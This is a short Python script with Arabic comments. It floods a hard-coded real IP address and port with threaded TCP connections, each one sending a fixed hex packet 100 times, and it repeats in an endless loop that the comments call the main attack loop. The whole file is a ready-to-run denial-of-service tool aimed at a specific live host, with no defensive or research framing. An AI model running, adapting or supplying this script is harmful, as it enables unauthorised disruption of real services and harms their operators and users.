import socket
import threading

# إعدادات الاتصال (تم تحديد IP والمنفذ مسبقًا)
ip = "5.223.46.86"  # عنوان IP الهدف
port = 10009  # المنفذ الهدف
num_connections = 100  # عدد الاتصالات في كل دورة
num_send_per_connection = 100  # عدد الحزم المرسلة لكل اتصال

# الحزمة التي سيتم إرسالها
packet = bytes.fromhex("F10400010900000001000000F1")

# دالة لتنفيذ الاتصال وإرسال الحزم
def send_packets(ip, port, packet, num_send_per_connection):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            for i in range(num_send_per_connection):
                s.sendall(packet)
                print(f"Packet {i + 1} sent to {ip}:{port}")
        print(f"[+] Successful connection to {ip}:{port}")
    except Exception as e:
        print(f"[-] Error: {e}")

# حلقة الهجوم الرئيسية
try:
    while True:  # تشغيل مستمر حتى يتم الإيقاف يدويًا
        threads = []
        for _ in range(num_connections):
            thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
            threads.append(thread)
            thread.start()

        # الانتظار حتى تنتهي جميع الـ Threads
        for thread in threads:
            thread.join()

except KeyboardInterrupt:
    print("\n[!] Program stopped by user. Exiting...")
